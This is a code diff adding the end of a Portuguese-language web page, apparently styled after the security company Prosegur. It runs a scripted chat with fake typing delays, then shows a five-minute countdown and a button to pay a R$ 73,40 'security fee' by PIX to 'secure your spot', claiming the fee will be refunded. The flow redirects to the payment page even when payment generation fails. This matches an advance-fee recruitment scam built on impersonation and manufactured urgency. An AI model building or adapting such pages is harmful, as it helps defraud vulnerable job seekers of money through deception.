+                let timeLeft = 300;
+                const timerElement = document.getElementById('timer');
+                const countdown = setInterval(() => {
+                    const minutes = Math.floor(timeLeft / 60);
+                    const seconds = timeLeft % 60;
+                    timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                    
+                    if (timeLeft <= 0) {
+                        clearInterval(countdown);
+                        timerElement.textContent = "00:00";
+                    }
+                    
+                    timeLeft--;
+                }, 1000);
+            }, 1000);
+        }
+        
+        // Show payment button if specified
+        if (response.showPaymentButton) {
+            setTimeout(() => {
+                const buttonHtml = `
+                    <div class="text-center" style="margin: 20px 0;">
+                        <button onclick="startPaymentProcess()" class="inline-block px-6 py-3 bg-green-600 text-prosegur-black font-semibold rounded-lg hover:bg-green-700 transition-colors duration-200" style="text-decoration: none; border: none; cursor: pointer;">
+                            <i class="fas fa-credit-card mr-2"></i>
+                            Realizar Pagamento Agora
+                        </button>
+                    </div>
+                `;
+                chatContainer.insertAdjacentHTML('beforeend', buttonHtml);
+                chatContainer.scrollTop = chatContainer.scrollHeight;
+            }, 1000);
+        }
+        
+        // Show options if specified
+        if (response.showOptions) {
+            setTimeout(() => {
+                showOptions(response.showOptions);
+            }, 1000);
+        }
+        
+        // Wait before next message
+        if (i < responses.length - 1) {
+            await new Promise(resolve => setTimeout(resolve, response.delay));
+        }
+    }
+}
+
+// Process message sequence
+async function processMessageSequence(sequence) {
+    for (let i = 0; i < sequence.length; i++) {
+        const msg = sequence[i];
+        const isLastMessage = i === sequence.length - 1;
+        const typingTime = msg.longTypingTime ? 8000 : 5000;
+        
+        await showTyping(typingTime);
+        addMessage(msg.message, true, isLastMessage);
+        
+        if (msg.showOptions) {
+            setTimeout(() => showOptions(msg.showOptions), 1000);
+        }
+        
+        if (msg.showTimer) {
+            setTimeout(() => {
+                const timerHtml = `
+                    <div class="timer-container mx-auto highlight-pulse" style="max-width: 600px; margin: 20px 0;">
+                        <div class="timer" id="timer">05:00</div>
+                        <div class="timer-label">Tempo restante para garantir sua vaga</div>
+                        <a href="/pagamento" class="action-button">
+                            <i class="fas fa-lock"></i> Efetuar Pagamento da Taxa de Segurança
+                        </a>
+                        <p class="mt-2 small text-muted">
+                            O valor de R$ 73,40 será totalmente reembolsado no seu primeiro pagamento.
+                        </p>
+                    </div>
+                `;
+                chatContainer.insertAdjacentHTML('beforeend', timerHtml);
+                chatContainer.scrollTop = chatContainer.scrollHeight;
+                
+                // Start timer
+                let timeLeft = 300;
+                const timerElement = document.getElementById('timer');
+                const countdown = setInterval(() => {
+                    const minutes = Math.floor(timeLeft / 60);
+                    const seconds = timeLeft % 60;
+                    timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                    
+                    if (timeLeft <= 0) {
+                        clearInterval(countdown);
+                        timerElement.textContent = "00:00";
+                    }
+                    
+                    timeLeft--;
+                }, 1000);
+            }, 1000);
+        }
+        
+        await new Promise(resolve => setTimeout(resolve, msg.delay));
+    }
+}
+
+// Show timer
+function showTimer() {
+    timerContainer.style.display = 'block';
+    let timeLeft = 300; // 5 minutes
+    
+    const countdown = setInterval(() => {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        
+        if (timeLeft <= 0) {
+            clearInterval(countdown);
+            timerElement.textContent = "00:00";
+        }
+        
+        timeLeft--;
+    }, 1000);
+}
+
+// Initialize chat
+async function initializeChat() {
+    // Hide all options initially
+    hideAllOptions();
+    
+    // Start chat sequence immediately
+    await processMessageSequence(chatSequence);
+}
+
+// Start payment process with loading
+function startPaymentProcess() {
+    // Show loading overlay
+    const loadingOverlay = document.createElement('div');
+    loadingOverlay.style.cssText = `
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.8);
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        z-index: 9999;
+        color: white;
+        font-family: 'Sora', sans-serif;
+    `;
+    
+    loadingOverlay.innerHTML = `
+        <div class="text-center">
+            <div class="spinner" style="
+                border: 4px solid #f3f3f3;
+                border-top: 4px solid #FBC804;
+                border-radius: 50%;
+                width: 60px;
+                height: 60px;
+                animation: spin 1s linear infinite;
+                margin: 0 auto 20px;
+            "></div>
+            <h3 style="font-size: 1.5rem; margin-bottom: 10px;">Gerando transação PIX...</h3>
+            <p style="font-size: 1rem; opacity: 0.8;">Aguarde enquanto preparamos seu pagamento</p>
+        </div>
+        <style>
+            @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+        </style>
+    `;
+    
+    document.body.appendChild(loadingOverlay);
+    
+    // Call payment generation endpoint, then redirect
+    fetch('/create_pix_payment', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            source: 'chat'
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            window.location.href = '/pagamento';
+        } else {
+            // If API fails, still redirect to payment page with mock data
+            setTimeout(() => {
+                window.location.href = '/pagamento';
+            }, 2000);
+        }
+    })
+    .catch(error => {
+        console.error('Error generating payment:', error);
+        // Fallback: redirect after delay even if API fails
+        setTimeout(() => {
+            window.location.href = '/pagamento';
+        }, 2000);
+    });
+}
+
+// Start chat when page loads
+document.addEventListener('DOMContentLoaded', initializeChat);
+</script>
+
+</body>
+</html>
